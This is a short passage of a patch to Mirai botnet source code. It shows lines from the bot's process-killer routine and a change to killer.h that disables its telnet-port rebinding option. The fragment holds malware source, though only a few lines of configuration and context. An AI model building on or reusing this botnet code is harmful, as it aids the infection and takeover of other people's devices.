@@ -65,6 +65,19 @@ index db1860c..716a967 100755
  
              // Resolve exe_path (/proc/$pid/exe) -> realpath
              if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
+diff --git a/mirai/bot/killer.h b/mirai/bot/killer.h
+index 7e2b657..309e70b 100755
+--- a/mirai/bot/killer.h
++++ b/mirai/bot/killer.h
+@@ -5,7 +5,7 @@
+ #define KILLER_MIN_PID              400
+ #define KILLER_RESTART_SCAN_TIME    600
+ 
+-#define KILLER_REBIND_TELNET
++// #define KILLER_REBIND_TELNET
+ // #define KILLER_REBIND_SSH
+ // #define KILLER_REBIND_HTTP
+ 
 diff --git a/mirai/bot/main.c b/mirai/bot/main.c
 index 8c0510f..1b3f8c1 100755
 --- a/mirai/bot/main.c
